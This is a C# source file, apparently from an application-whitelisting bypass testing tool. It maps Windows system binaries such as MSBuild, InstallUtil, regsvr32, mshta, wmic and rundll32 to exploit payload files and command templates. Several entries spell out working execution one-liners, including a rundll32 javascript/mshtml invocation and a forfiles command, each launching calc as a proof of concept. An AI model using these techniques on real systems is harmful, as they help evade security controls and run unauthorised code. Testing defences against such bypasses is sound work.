using Contracts;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ExploitEngine.Vulnerabilities
{
    public static class ThreatToExploitMatcher
    {
        public static Dictionary<VulnerabilityType, IExploit> Matcher { get; set; }

        static ThreatToExploitMatcher()
        {
            Matcher = new Dictionary<VulnerabilityType, IExploit>
            {
                { VulnerabilityType.MSBuild_v2_0_50727, new ExploitBase(@"Exploits\MsBuild.xml") },
                { VulnerabilityType.MSBuild_v3_5, new ExploitBase(@"Exploits\MsBuild.xml") },
                { VulnerabilityType.MSBuild_v4_0_30319, new ExploitBase(@"Exploits\MsBuild.xml") },
                { VulnerabilityType.MSBuild_x64_v2_0_50727, new ExploitBase(@"Exploits\MsBuild.xml") },
                { VulnerabilityType.MSBuild_x64_v3_5, new ExploitBase(@"Exploits\MsBuild.xml") },
                { VulnerabilityType.MSBuild_x64_v4_0_30319, new ExploitBase(@"Exploits\MsBuild.xml") },

                { VulnerabilityType.InstallUtil_v2_0_50727, new ExploitBase(@"Exploits\InstallUtil.exe","\"{0}\" /U {1}")},
                { VulnerabilityType.InstallUtil_v4_0_30319, new ExploitBase(@"Exploits\InstallUtil.exe","\"{0}\" /U {1}")},
                { VulnerabilityType.InstallUtil_x64_v2_0_50727, new ExploitBase(@"Exploits\InstallUtil.exe","\"{0}\" /U {1}")},
                { VulnerabilityType.InstallUtil_x64_v4_0_30319, new ExploitBase(@"Exploits\InstallUtil.exe","\"{0}\" /U {1}")},

                { VulnerabilityType.PresentationHost_System32, new ExploitBase(@"Exploits\PresentationHost.xbap","{0} \"{1}\"") },
                { VulnerabilityType.PresentationHost_SysWOW64, new ExploitBase(@"Exploits\PresentationHost.xbap","{0} \"{1}\"") },

                { VulnerabilityType.MsHta_SysWow64, new ExploitBase(@"Exploits\MsHta.hta") },
                { VulnerabilityType.MsHta_System32, new ExploitBase(@"Exploits\MsHta.hta") },

                { VulnerabilityType.RegSvr32_SysWow64, new ExploitBase(@"Exploits\RegSvr32.sct") },
                { VulnerabilityType.RegSvr32_System32, new ExploitBase(@"Exploits\RegSvr32.sct") },

                { VulnerabilityType.Wmic_SysWow64, new ExploitBase(@"Exploits\Wmic.exe", "\"{0}\" process call create '{1}'") },
                { VulnerabilityType.Wmic_System32, new ExploitBase(@"Exploits\Wmic.exe", "\"{0}\" process call create '{1}'") },

                { VulnerabilityType.CScript_SysWow64, new ExploitBase(@"Exploits\VBScript.vbs") },
                { VulnerabilityType.CScript_System32, new ExploitBase(@"Exploits\VBScript.vbs") },
                { VulnerabilityType.WScript_SysWow64, new ExploitBase(@"Exploits\VBScript.vbs") },
                { VulnerabilityType.WScript_System32, new ExploitBase(@"Exploits\VBScript.vbs") },

                { VulnerabilityType.Cmd_SysWow64, new ExploitBase(@"Exploits\cmd.bat","\"{0}\" /k {1}" )},
                { VulnerabilityType.Cmd_System32, new ExploitBase(@"Exploits\cmd.bat","\"{0}\" /k {1}" )},

                { VulnerabilityType.Csi_MsBuild_14, new ExploitBase(@"Exploits\Csi.csx" )},
                { VulnerabilityType.Csi_MsBuild_14_Amd64, new ExploitBase(@"Exploits\Csi.csx" )},

                { VulnerabilityType.MsXsl, new ExploitBase(@"Exploits\MsXsl\msxsl.xml","\"{0}\" {1} msxsl.xsl" )},

                //Need to set registry as shown in the following post: http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/
                { VulnerabilityType.AtBroker_System32, new ExploitBase(@"Exploits\atbroker.exe","\"{0}\" /start {1}" )},
                { VulnerabilityType.AtBroker_SysWow64, new ExploitBase(@"Exploits\atbroker.exe","\"{0}\" /start {1}" )},

                { VulnerabilityType.ForFiles_System32, new ExploitBase("","\"{0}\" /p c:\\windows\\system32 /m notepad.exe /c calc.exe" )},
                { VulnerabilityType.ForFiles_SysWow64, new ExploitBase("","\"{0}\" /p c:\\windows\\system32 /m notepad.exe /c calc.exe" )},

                { VulnerabilityType.RunDll32_System32, new ExploitBase("","{0} javascript:\".\\..\\mshtml.dll,RunHTMLApplication \";eval(\"w=new%20ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");" )},
                { VulnerabilityType.RunDll32_SysWow64, new ExploitBase("","{0} javascript:\".\\..\\mshtml.dll,RunHTMLApplication \";eval(\"w=new%20ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");" )},


        };
        }
    }
}
